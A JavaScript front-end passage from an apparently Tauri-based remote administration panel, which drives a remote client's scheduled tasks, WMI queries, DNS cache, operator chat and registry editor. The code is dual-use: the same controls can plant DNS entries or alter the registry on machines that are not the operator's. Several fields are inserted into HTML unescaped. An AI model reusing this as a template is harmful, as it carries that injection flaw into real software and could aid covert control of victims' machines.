  renderScheduledTasks(taskTasks);
});

// Context menu for task actions
let taskContextTask = null;

function showTaskContextMenu(e, task) {
  e.preventDefault();
  e.stopPropagation();
  taskContextTask = task;

  // Update context menu items based on task status
  const enableItem = taskContextMenu.querySelector('[data-action="enable"]');
  const disableItem = taskContextMenu.querySelector('[data-action="disable"]');

  if (task.status.toLowerCase() === 'disabled') {
    enableItem.style.display = '';
    disableItem.style.display = 'none';
  } else {
    enableItem.style.display = 'none';
    disableItem.style.display = '';
  }

  // Hide first, position with flip logic, then show
  taskContextMenu.classList.remove('show');
  setTimeout(() => positionContextMenu(taskContextMenu, e.clientX, e.clientY), 10);
}

function hideTaskContextMenu() {
  taskContextMenu.classList.remove('show');
  taskContextTask = null;
}

// Hide context menu on click outside
document.addEventListener('click', () => {
  hideTaskContextMenu();
});

// Hide context menu on mouse leave
taskContextMenu?.addEventListener('mouseleave', () => {
  hideTaskContextMenu();
});

// Handle context menu actions
taskContextMenu?.addEventListener('click', async (e) => {
  e.stopPropagation();
  const action = e.target.dataset.action;
  if (!action || !taskContextTask) return;

  const task = taskContextTask;
  hideTaskContextMenu();

  switch (action) {
    case 'run':
      runScheduledTask(task);
      break;
    case 'enable':
      enableScheduledTask(task);
      break;
    case 'disable':
      disableScheduledTask(task);
      break;
    case 'delete':
      deleteScheduledTask(task);
      break;
  }
});

// Close on overlay click
taskmgrOverlay?.addEventListener('click', (e) => {
  if (e.target === taskmgrOverlay) {
    closeTaskScheduler();
  }
});

// Initialize sorting
setupTaskSorting();

// Task Scheduler shell-response listener
(async function setupTaskResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
    if (event.payload.uid !== currentTaskUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'ScheduledTaskList':
        if (response.data.result?.tasks) {
          renderScheduledTasks(response.data.result.tasks);
        }
        break;
      case 'ScheduledTaskResult':
        if (response.data.result?.success) {
          const actionVerb = lastTaskAction === 'run' ? 'started' :
                            lastTaskAction === 'enable' ? 'enabled' :
                            lastTaskAction === 'disable' ? 'disabled' : 'deleted';
          taskStatusText.textContent = `${lastTaskName} ${actionVerb} successfully`;
          lastTaskAction = null;
          lastTaskName = null;
          // Refresh after action
          setTimeout(() => {
            loadScheduledTasks();
          }, 1000);
        } else {
          taskStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Operation failed');
          lastTaskAction = null;
          lastTaskName = null;
        }
        break;
      case 'Error':
        taskStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        lastTaskAction = null;
        lastTaskName = null;
        break;
    }
  });
})();

// ============ WMI Console System ============

// WMI DOM elements
const wmiOverlay = document.getElementById('wmi-overlay');
const wmiClose = document.getElementById('wmi-close');
const wmiNamespace = document.getElementById('wmi-namespace');
const wmiQuery = document.getElementById('wmi-query');
const wmiExecute = document.getElementById('wmi-execute');
const wmiResults = document.getElementById('wmi-results');
const wmiStatusText = document.getElementById('wmi-status-text');
const wmiTitleText = document.getElementById('wmi-title-text');

// WMI state
let currentWmiUid = null;

// Open WMI Console for a client
async function openWmiConsole(client) {
  currentWmiUid = client.uid;
  wmiTitleText.textContent = `WMI Console - ${client.user}@${client.machine}`;
  wmiStatusText.textContent = 'Ready';
  wmiResults.innerHTML = '<div style="color:#888;">Enter a WMI query and click Execute</div>';
  wmiQuery.value = 'SELECT * FROM Win32_Process';
  wmiOverlay.classList.add('show');
}

// Close WMI Console
function closeWmiConsole() {
  wmiOverlay.classList.remove('show');
  currentWmiUid = null;
}

// Execute WMI query
async function executeWmiQuery() {
  if (!currentWmiUid) return;

  const query = wmiQuery.value.trim();
  if (!query) {
    wmiStatusText.textContent = 'Please enter a query';
    return;
  }

  const namespace = wmiNamespace.value.trim() || null;

  wmiStatusText.textContent = 'Executing...';
  wmiResults.innerHTML = '<div style="color:#888;">Executing query...</div>';

  try {
    await invoke('send_command', {
      uid: currentWmiUid,
      command: { type: 'WmiQuery', params: { query, namespace } }
    });
  } catch (e) {
    wmiStatusText.textContent = 'Error: ' + e;
    wmiResults.innerHTML = `<div style="color:#f87171;">Error: ${e}</div>`;
  }
}

// Calculate smart column widths based on content
function calculateColumnWidths(columns, rows) {
  const widths = [];
  const minWidth = 60;
  const maxWidth = 350;
  const charWidth = 7; // approximate pixels per character
  const padding = 24; // cell padding

  for (let i = 0; i < columns.length; i++) {
    // Start with header length
    let headerLen = columns[i].length;

    // Calculate average content length (sample up to 50 rows for performance)
    const sampleSize = Math.min(rows.length, 50);
    let totalLen = 0;
    let maxLen = 0;

    for (let j = 0; j < sampleSize; j++) {
      const cellLen = (rows[j][i] || '').length;
      totalLen += cellLen;
      maxLen = Math.max(maxLen, cellLen);
    }

    const avgLen = sampleSize > 0 ? totalLen / sampleSize : 0;

    // Use weighted average: 60% average, 40% max (capped), consider header
    const effectiveLen = Math.max(
      headerLen,
      Math.round(avgLen * 0.6 + Math.min(maxLen, avgLen * 2) * 0.4)
    );

    // Convert to pixels and clamp
    const width = Math.max(minWidth, Math.min(maxWidth, effectiveLen * charWidth + padding));
    widths.push(width);
  }

  return widths;
}

// Render WMI results as a table
function renderWmiResults(columns, rows) {
  if (columns.length === 0 || rows.length === 0) {
    wmiResults.innerHTML = '<div style="color:#888;">No results</div>';
    wmiStatusText.textContent = 'No results';
    return;
  }

  // Calculate smart column widths
  const widths = calculateColumnWidths(columns, rows);
  const totalWidth = widths.reduce((a, b) => a + b, 0);

  let html = `<table style="width:${totalWidth}px;min-width:${totalWidth}px;table-layout:fixed;"><thead><tr>`;
  for (let i = 0; i < columns.length; i++) {
    const col = columns[i];
    html += `<th style="width:${widths[i]}px;" title="${col}">${col}</th>`;
  }
  html += '</tr></thead><tbody>';

  for (const row of rows) {
    html += '<tr>';
    for (let i = 0; i < row.length; i++) {
      const cell = row[i];
      const escaped = (cell || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      html += `<td title="${escaped}">${escaped}</td>`;
    }
    html += '</tr>';
  }

  html += '</tbody></table>';
  wmiResults.innerHTML = html;
  wmiStatusText.textContent = `${rows.length} result(s)`;
}

// WMI event handlers
wmiClose?.addEventListener('click', closeWmiConsole);
wmiExecute?.addEventListener('click', executeWmiQuery);

// Handle Enter key in query input
wmiQuery?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    executeWmiQuery();
  }
});

// Preset buttons
document.querySelectorAll('.wmi-preset-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    wmiQuery.value = btn.dataset.query;
    executeWmiQuery();
  });
});

// Close on Escape
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && wmiOverlay.classList.contains('show')) {
    closeWmiConsole();
  }
});

// WMI response listener
(function() {
  if (!window.__TAURI__?.event) return;
  const { listen } = window.__TAURI__.event;

  listen('shell-response', (event) => {
    if (event.payload.uid !== currentWmiUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'WmiQueryResult':
        if (response.data.result) {
          renderWmiResults(response.data.result.columns || [], response.data.result.rows || []);
        }
        break;
      case 'Error':
        wmiStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        wmiResults.innerHTML = `<div style="color:#f87171;">Error: ${response.data.result?.message || 'Unknown error'}</div>`;
        break;
    }
  });
})();

// ============ DNS Cache System ============

// DNS DOM elements
const dnsOverlay = document.getElementById('dns-overlay');
const dnsClose = document.getElementById('dns-close');
const dnsSearch = document.getElementById('dns-search');
const dnsList = document.getElementById('dns-list');
const dnsStatusText = document.getElementById('dns-status-text');
const dnsTitleText = document.getElementById('dns-title-text');
const dnsRefresh = document.getElementById('dns-refresh');
const dnsFlush = document.getElementById('dns-flush');
const dnsAdd = document.getElementById('dns-add');

// DNS state
let currentDnsUid = null;
let dnsEntries = [];
let dnsSearchTerm = '';

// Open DNS Cache for a client
async function openDnsCache(client) {
  currentDnsUid = client.uid;
  dnsTitleText.textContent = `DNS Cache - ${client.user}@${client.machine}`;
  dnsStatusText.textContent = 'Loading...';
  dnsList.innerHTML = '<tr><td colspan="4" class="pm-loading">Loading...</td></tr>';
  dnsOverlay.classList.add('show');
  await loadDnsCache();
}

// Close DNS Cache
function closeDnsCache() {
  dnsOverlay.classList.remove('show');
  currentDnsUid = null;
}

// Load DNS cache entries
async function loadDnsCache() {
  if (!currentDnsUid) return;

  dnsStatusText.textContent = 'Loading...';

  try {
    await invoke('send_command', {
      uid: currentDnsUid,
      command: { type: 'GetDnsCache' }
    });
  } catch (e) {
    dnsStatusText.textContent = 'Error: ' + e;
  }
}

// Render DNS entries
function renderDnsEntries(entries) {
  dnsEntries = entries;

  // Filter entries
  let filtered = entries;
  if (dnsSearchTerm) {
    const term = dnsSearchTerm.toLowerCase();
    filtered = entries.filter(e =>
      e.name.toLowerCase().includes(term) ||
      e.data.toLowerCase().includes(term) ||
      e.record_type.toLowerCase().includes(term)
    );
  }

  if (filtered.length === 0) {
    dnsList.innerHTML = '<tr><td colspan="4" class="pm-loading">No entries found</td></tr>';
    dnsStatusText.textContent = 'No entries';
    return;
  }

  dnsList.innerHTML = filtered.map(entry => `
    <tr data-hostname="${entry.name}" data-data="${entry.data}" data-type="${entry.record_type}">
      <td class="dns-col-name" title="${entry.name}">${entry.name}</td>
      <td class="dns-col-type">${entry.record_type}</td>
      <td class="dns-col-data" title="${entry.data}">${entry.data}</td>
      <td class="dns-col-ttl">${entry.ttl}s</td>
    </tr>
  `).join('');

  dnsStatusText.textContent = `${filtered.length} entr${filtered.length === 1 ? 'y' : 'ies'}`;
}

// Flush DNS cache
async function flushDnsCache() {
  if (!currentDnsUid) return;
  if (!confirm('Flush the DNS cache? This will clear all cached DNS entries.')) return;

  dnsStatusText.textContent = 'Flushing...';

  try {
    await invoke('send_command', {
      uid: currentDnsUid,
      command: { type: 'FlushDnsCache' }
    });
  } catch (e) {
    dnsStatusText.textContent = 'Error: ' + e;
  }
}

// Add DNS entry
async function addDnsEntry() {
  if (!currentDnsUid) return;

  const hostname = prompt('Enter hostname:');
  if (!hostname) return;

  const ip = prompt('Enter IP address:');
  if (!ip) return;

  dnsStatusText.textContent = 'Adding entry...';

  try {
    await invoke('send_command', {
      uid: currentDnsUid,
      command: { type: 'AddDnsCacheEntry', params: { hostname, ip } }
    });
  } catch (e) {
    dnsStatusText.textContent = 'Error: ' + e;
  }
}

// DNS event handlers
dnsClose?.addEventListener('click', closeDnsCache);
dnsRefresh?.addEventListener('click', loadDnsCache);
dnsFlush?.addEventListener('click', flushDnsCache);
dnsAdd?.addEventListener('click', addDnsEntry);

// DNS search
dnsSearch?.addEventListener('input', (e) => {
  dnsSearchTerm = e.target.value;
  renderDnsEntries(dnsEntries);
});

// DNS Context Menu
const dnsContextMenu = document.getElementById('dns-context-menu');
let selectedDnsEntry = null;

// Show context menu on right-click
dnsList?.addEventListener('contextmenu', (e) => {
  const row = e.target.closest('tr');
  if (!row || !row.dataset.hostname) return;

  e.preventDefault();

  // Store selected entry data
  selectedDnsEntry = {
    hostname: row.dataset.hostname,
    data: row.dataset.data,
    type: row.dataset.type
  };

  // Position and show menu
  dnsContextMenu.style.left = e.clientX + 'px';
  dnsContextMenu.style.top = e.clientY + 'px';
  dnsContextMenu.classList.add('show');
});

// Handle context menu actions
dnsContextMenu?.addEventListener('click', async (e) => {
  const action = e.target.dataset.action;
  if (!action || !selectedDnsEntry) return;

  dnsContextMenu.classList.remove('show');

  switch (action) {
    case 'copy-hostname':
      navigator.clipboard.writeText(selectedDnsEntry.hostname);
      dnsStatusText.textContent = 'Hostname copied to clipboard';
      break;
    case 'copy-ip':
      navigator.clipboard.writeText(selectedDnsEntry.data);
      dnsStatusText.textContent = 'Data copied to clipboard';
      break;
    case 'remove':
      if (currentDnsUid) {
        try {
          await invoke('send_command', {
            uid: currentDnsUid,
            command: { type: 'RemoveDnsCacheEntry', params: { hostname: selectedDnsEntry.hostname } }
          });
          dnsStatusText.textContent = `Removing ${selectedDnsEntry.hostname}...`;
        } catch (e) {
          dnsStatusText.textContent = 'Error: ' + e;
        }
      }
      break;
  }

  selectedDnsEntry = null;
});

// Close context menu on click outside or escape
document.addEventListener('click', (e) => {
  if (!e.target.closest('#dns-context-menu')) {
    dnsContextMenu?.classList.remove('show');
  }
});

// Close on Escape
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    dnsContextMenu?.classList.remove('show');
    if (dnsOverlay.classList.contains('show')) {
      closeDnsCache();
    }
  }
});

// DNS response listener
(function() {
  if (!window.__TAURI__?.event) return;
  const { listen } = window.__TAURI__.event;

  listen('shell-response', (event) => {
    if (event.payload.uid !== currentDnsUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'DnsCacheEntries':
        if (response.data.result?.entries) {
          renderDnsEntries(response.data.result.entries);
        }
        break;
      case 'DnsCacheResult':
        if (response.data.result?.success) {
          dnsStatusText.textContent = response.data.result.message || 'Success';
          // Refresh after operation
          setTimeout(() => loadDnsCache(), 500);
        } else {
          dnsStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Operation failed');
        }
        break;
      case 'Error':
        dnsStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        break;
    }
  });
})();

// ============ Chat System ============

// Chat DOM elements
const chatOverlay = document.getElementById('chat-overlay');
const chatClose = document.getElementById('chat-close');
const chatMessages = document.getElementById('chat-messages');
const chatInput = document.getElementById('chat-input');
const chatSend = document.getElementById('chat-send');
const chatStatusText = document.getElementById('chat-status-text');
const chatTitleText = document.getElementById('chat-title-text');

// Chat state
let currentChatUid = null;
let chatOperatorName = 'Support';
let chatIsOpen = false;

// Open chat window and prompt for operator name
async function openChatWindow(client) {
  // Prompt for operator name
  const name = prompt('Enter your operator name:', chatOperatorName);
  if (!name || name.trim() === '') {
    return; // User cancelled
  }
  chatOperatorName = name.trim();

  currentChatUid = client.uid;
  chatIsOpen = true;

  chatTitleText.textContent = `Chat - ${client.user}@${client.machine}`;
  chatMessages.innerHTML = '';
  chatStatusText.textContent = 'Connecting...';
  chatOverlay.classList.add('show');

  // Send chat start command
  try {
    await invoke('send_command', {
      uid: currentChatUid,
      command: { type: 'ChatStart', params: { operator_name: chatOperatorName } }
    });
  } catch (e) {
    chatStatusText.textContent = 'Error: ' + e;
  }
}

// Close chat window
async function closeChatWindow() {
  if (currentChatUid && chatIsOpen) {
    try {
      await invoke('send_command', {
        uid: currentChatUid,
        command: { type: 'ChatClose' }
      });
    } catch (e) {
      console.error('Error closing chat:', e);
    }
  }
  chatOverlay.classList.remove('show');
  currentChatUid = null;
  chatIsOpen = false;
}

// Send a chat message
async function sendChatMessage() {
  if (!currentChatUid || !chatIsOpen) return;

  const message = chatInput.value.trim();
  if (!message) return;

  // Add to UI immediately
  addChatMessage(chatOperatorName, message, 'operator');
  chatInput.value = '';

  // Send to client
  try {
    await invoke('send_command', {
      uid: currentChatUid,
      command: { type: 'ChatMessage', params: { message: message } }
    });
  } catch (e) {
    chatStatusText.textContent = 'Error: ' + e;
  }
}

// Add a message to the chat display
function addChatMessage(sender, message, type) {
  const msgDiv = document.createElement('div');
  msgDiv.className = `chat-message ${type}`;

  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

  msgDiv.innerHTML = `
    <div class="chat-sender">${escapeHtml(sender)}</div>
    <div class="chat-text">${escapeHtml(message)}</div>
    <div class="chat-time">${time}</div>
  `;

  chatMessages.appendChild(msgDiv);
  chatMessages.scrollTop = chatMessages.scrollHeight;
}

// Chat event listeners
chatClose?.addEventListener('click', closeChatWindow);

chatSend?.addEventListener('click', sendChatMessage);

chatInput?.addEventListener('keypress', (e) => {
  if (e.key === 'Enter') {
    sendChatMessage();
  }
});

// Close on overlay click
chatOverlay?.addEventListener('click', (e) => {
  if (e.target === chatOverlay) {
    closeChatWindow();
  }
});

// Chat shell-response listener
(async function setupChatResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
    if (event.payload.uid !== currentChatUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'ChatStarted':
        chatStatusText.textContent = 'Connected';
        addChatMessage('System', `Chat session started with ${chatOperatorName}`, 'operator');
        break;
      case 'ChatUserMessage':
        if (response.data.result?.message) {
          addChatMessage('User', response.data.result.message, 'user');
        }
        break;
      case 'ChatClosed':
        chatStatusText.textContent = 'Disconnected';
        addChatMessage('System', 'Chat session ended', 'operator');
        chatIsOpen = false;
        break;
      case 'Error':
        chatStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        break;
    }
  });
})();

// ============ Registry Manager System ============

// Registry Manager DOM elements
const registryOverlay = document.getElementById('registry-overlay');
const registryClose = document.getElementById('registry-close');
const regPath = document.getElementById('reg-path');
const regKeysList = document.getElementById('reg-keys-list');
const regValuesList = document.getElementById('reg-values-list');
const regStatusText = document.getElementById('reg-status-text');
const registryTitleText = document.getElementById('registry-title-text');
const regTree = document.getElementById('reg-tree');
const regCtx = document.getElementById('reg-ctx');

// Registry Manager state
let currentRegUid = null;
let currentRegPath = 'HKEY_LOCAL_MACHINE';
let regHistory = [];
let regHistoryIndex = -1;
let regSelectedKey = null;
let regSelectedValue = null;
let regKeys = [];
let regValues = [];

// Open registry manager for a client
async function openRegistryManager(client) {
  currentRegUid = client.uid;
  currentRegPath = 'HKEY_LOCAL_MACHINE';
  regHistory = ['HKEY_LOCAL_MACHINE'];
  regHistoryIndex = 0;
  regSelectedKey = null;
  regSelectedValue = null;
  regKeys = [];
  regValues = [];

  registryTitleText.textContent = `Registry Editor - ${client.user}@${client.machine}`;
  regPath.value = currentRegPath;
  registryOverlay.classList.add('show');

  // Update tree selection
  regTree.querySelectorAll('.reg-tree-item').forEach(item => {
    item.classList.toggle('active', item.dataset.path === currentRegPath);
  });

  // Load initial keys
  loadRegKeys(currentRegPath);
}

// Close registry manager
function closeRegistryManager() {
  registryOverlay.classList.remove('show');
  currentRegUid = null;
}

// Load registry keys
async function loadRegKeys(path) {
  if (!currentRegUid) return;

  currentRegPath = path;
  regPath.value = path;
  regSelectedKey = null;
  regStatusText.textContent = 'Loading...';
  regKeysList.innerHTML = '<div class="reg-loading">Loading...</div>';
  regValuesList.innerHTML = '<div class="reg-loading">Select a key</div>';

  try {
    await invoke('send_command', {
      uid: currentRegUid,
      command: { type: 'RegistryListKeys', params: { path } }
    });
    // Also load values for the current key
    await invoke('send_command', {
      uid: currentRegUid,
      command: { type: 'RegistryListValues', params: { path } }
    });
  } catch (e) {
    regStatusText.textContent = 'Error: ' + e;
    regKeysList.innerHTML = `<div class="reg-loading" style="color:#f87171">Error: ${e}</div>`;
  }
}

// Render registry keys
function renderRegKeys(keys) {
  regKeys = keys;
  regStatusText.textContent = `${keys.length} subkeys`;

  if (keys.length === 0) {
    regKeysList.innerHTML = '<div class="reg-loading">No subkeys</div>';
    return;
  }

  regKeysList.innerHTML = keys.map(key => `
    <div class="reg-key-item" data-name="${escapeHtml(key.name)}" title="${escapeHtml(key.name)} (${key.subkey_count} subkeys, ${key.value_count} values)">
      <span class="reg-key-icon">📁</span>
      <span class="reg-key-name">${escapeHtml(key.name)}</span>
    </div>
  `).join('');

  // Add click handlers
  regKeysList.querySelectorAll('.reg-key-item').forEach(item => {
    item.addEventListener('click', () => {
      // Deselect previous
      regKeysList.querySelectorAll('.reg-key-item').forEach(i => i.classList.remove('selected'));
      item.classList.add('selected');
      regSelectedKey = item.dataset.name;
    });

    item.addEventListener('dblclick', () => {
      const name = item.dataset.name;
      const newPath = currentRegPath + '\\' + name;
      navigateToRegPath(newPath);
    });

    item.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      regKeysList.querySelectorAll('.reg-key-item').forEach(i => i.classList.remove('selected'));
      item.classList.add('selected');
      regSelectedKey = item.dataset.name;
      regSelectedValue = null;
      showRegContextMenu(e.pageX, e.pageY, 'key');
    });
  });
}

// Render registry values
function renderRegValues(values) {
  regValues = values;

  if (values.length === 0) {
    regValuesList.innerHTML = '<div class="reg-loading">No values</div>';
    return;
  }

  regValuesList.innerHTML = values.map(val => `
    <div class="reg-value-item" data-name="${escapeHtml(val.name)}" title="${escapeHtml(val.data)}">
      <span class="reg-value-name">${escapeHtml(val.name)}</span>
      <span class="reg-value-type">${escapeHtml(val.value_type)}</span>
      <span class="reg-value-data">${escapeHtml(val.data)}</span>
    </div>
  `).join('');

  // Add click handlers
  regValuesList.querySelectorAll('.reg-value-item').forEach(item => {
    item.addEventListener('click', () => {
      regValuesList.querySelectorAll('.reg-value-item').forEach(i => i.classList.remove('selected'));
      item.classList.add('selected');
      regSelectedValue = item.dataset.name;
    });

    item.addEventListener('dblclick', () => {
      editRegValue(item.dataset.name);
    });

    item.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      regValuesList.querySelectorAll('.reg-value-item').forEach(i => i.classList.remove('selected'));
      item.classList.add('selected');
      regSelectedValue = item.dataset.name;
      regSelectedKey = null;
      showRegContextMenu(e.pageX, e.pageY, 'value');
    });
  });
}

// Navigate to registry path
function navigateToRegPath(path, addToHistory = true) {
  if (addToHistory) {
    // Trim history forward if we navigated back then forward
    regHistory = regHistory.slice(0, regHistoryIndex + 1);
    regHistory.push(path);
    regHistoryIndex = regHistory.length - 1;
  }

  // Update tree selection for root hives
  const rootHive = path.split('\\')[0];
  regTree.querySelectorAll('.reg-tree-item').forEach(item => {
    item.classList.toggle('active', item.dataset.path === rootHive);
  });

  loadRegKeys(path);
}

// Show context menu
function showRegContextMenu(x, y, type) {
  regCtx.classList.remove('show');

  // Show/hide appropriate items based on type
  regCtx.querySelectorAll('.ctx-item').forEach(item => {
    const action = item.dataset.action;
    if (type === 'key') {
      item.style.display = ['reg-new-key', 'reg-delete', 'reg-copy-path'].includes(action) ? 'block' : 'none';
    } else {
      item.style.display = ['reg-edit', 'reg-delete', 'reg-copy-path'].includes(action) ? 'block' : 'none';
    }
  });

  regCtx.style.left = x + 'px';
  regCtx.style.top = y + 'px';
  setTimeout(() => regCtx.classList.add('show'), 10);
}

// Hide context menu
function hideRegContextMenu() {
  regCtx.classList.remove('show');
}

// Edit registry value
async function editRegValue(name) {
  const val = regValues.find(v => v.name === name);
  if (!val) return;

  const newData = prompt(`Edit ${name} (${val.value_type}):`, val.data);
  if (newData === null || newData === val.data) return;

  regStatusText.textContent = 'Saving...';
  try {
    await invoke('send_command', {
      uid: currentRegUid,
      command: {
        type: 'RegistrySetValue',
        params: {
          path: currentRegPath,
          name: name === '(Default)' ? '' : name,
          value_type: val.value_type,
          data: newData
        }
      }
    });
  } catch (e) {
    regStatusText.textContent = 'Error: ' + e;
  }
}

// Create new registry key
async function createNewKey() {
  const name = prompt('Enter new key name:');
  if (!name) return;

  const newPath = currentRegPath + '\\' + name;
  regStatusText.textContent = 'Creating...';
  try {
    await invoke('send_command', {
      uid: currentRegUid,
      command: { type: 'RegistryCreateKey', params: { path: newPath } }
    });
  } catch (e) {
    regStatusText.textContent = 'Error: ' + e;
  }
}

// Create new registry value
async function createNewValue() {
  const name = prompt('Enter value name:');
  if (!name) return;

  const typeOptions = ['String', 'DWord', 'QWord', 'Binary', 'ExpandString', 'MultiString'];
  const typeIdx = prompt('Select type (0-5):\n0: String\n1: DWord\n2: QWord\n3: Binary\n4: ExpandString\n5: MultiString', '0');
  if (typeIdx === null) return;

  const valueType = typeOptions[parseInt(typeIdx)] || 'String';
  const data = prompt(`Enter ${valueType} value:`, valueType === 'DWord' ? '0' : '');
  if (data === null) return;

  regStatusText.textContent = 'Creating...';
  try {
    await invoke('send_command', {
      uid: currentRegUid,
      command: {
        type: 'RegistrySetValue',
        params: { path: currentRegPath, name, value_type: valueType, data }
      }
    });
  } catch (e) {
    regStatusText.textContent = 'Error: ' + e;
  }
}

// Delete selected item
async function deleteRegSelected() {
  if (regSelectedKey) {
    if (!confirm(`Delete key "${regSelectedKey}" and all its subkeys?`)) return;

    const keyPath = currentRegPath + '\\' + regSelectedKey;
    regStatusText.textContent = 'Deleting...';
    try {
      await invoke('send_command', {
        uid: currentRegUid,
        command: { type: 'RegistryDeleteKey', params: { path: keyPath, recursive: true } }
      });
    } catch (e) {
      regStatusText.textContent = 'Error: ' + e;
    }
  } else if (regSelectedValue) {
    if (!confirm(`Delete value "${regSelectedValue}"?`)) return;

    regStatusText.textContent = 'Deleting...';
    try {
      await invoke('send_command', {
        uid: currentRegUid,
        command: {
          type: 'RegistryDeleteValue',
          params: { path: currentRegPath, name: regSelectedValue === '(Default)' ? '' : regSelectedValue }
        }
      });
    } catch (e) {
      regStatusText.textContent = 'Error: ' + e;
    }
  }
}

// Registry Manager event listeners
registryClose?.addEventListener('click', closeRegistryManager);

document.getElementById('reg-back')?.addEventListener('click', () => {
  if (regHistoryIndex > 0) {
    regHistoryIndex--;
    navigateToRegPath(regHistory[regHistoryIndex], false);
  }
});

document.getElementById('reg-up')?.addEventListener('click', () => {
  const parts = currentRegPath.split('\\');
  if (parts.length > 1) {
    parts.pop();
    navigateToRegPath(parts.join('\\'));
  }
});

document.getElementById('reg-refresh')?.addEventListener('click', () => {
  loadRegKeys(currentRegPath);
});

document.getElementById('reg-go')?.addEventListener('click', () => {
  const path = regPath.value.trim();
  if (path) navigateToRegPath(path);
});

regPath?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const path = regPath.value.trim();
    if (path) navigateToRegPath(path);
  }
});

// Tree item clicks
regTree?.addEventListener('click', (e) => {
  const item = e.target.closest('.reg-tree-item');
  if (item) {
    navigateToRegPath(item.dataset.path);
  }
});

// Context menu actions
regCtx?.addEventListener('click', (e) => {
  const action = e.target.dataset.action;
  if (!action) return;

  hideRegContextMenu();

  switch (action) {
    case 'reg-new-key':
      createNewKey();
      break;
    case 'reg-new-value':
      createNewValue();
      break;
    case 'reg-edit':
      if (regSelectedValue) editRegValue(regSelectedValue);
      break;
    case 'reg-delete':
      deleteRegSelected();
      break;
    case 'reg-copy-path':
      const path = regSelectedKey ? currentRegPath + '\\' + regSelectedKey : currentRegPath;
      navigator.clipboard?.writeText(path);
      regStatusText.textContent = 'Path copied';
      break;
  }
});

// Hide context menu on click outside
document.addEventListener('click', (e) => {
  if (!e.target.closest('.reg-ctx')) {
    hideRegContextMenu();
  }
});

// Close on escape
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && registryOverlay?.classList.contains('show')) {
    closeRegistryManager();
  }
});

// Close on overlay click
registryOverlay?.addEventListener('click', (e) => {
  if (e.target === registryOverlay) {
    closeRegistryManager();
  }
});

// Registry Manager shell-response listener
(async function setupRegResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
    if (event.payload.uid !== currentRegUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'RegistryKeys':
        if (response.data.result?.keys) {
          renderRegKeys(response.data.result.keys);
        }
        break;
      case 'RegistryValues':
        if (response.data.result?.values) {
          renderRegValues(response.data.result.values);
        }
        break;
      case 'RegistryResult':
        if (response.data.result?.success) {
          regStatusText.textContent = response.data.result.message || 'Success';
          // Refresh the current view
          loadRegKeys(currentRegPath);
        } else {
          regStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Operation failed');
        }
        break;
      case 'Error':
        regStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        break;
    }
  });
})();


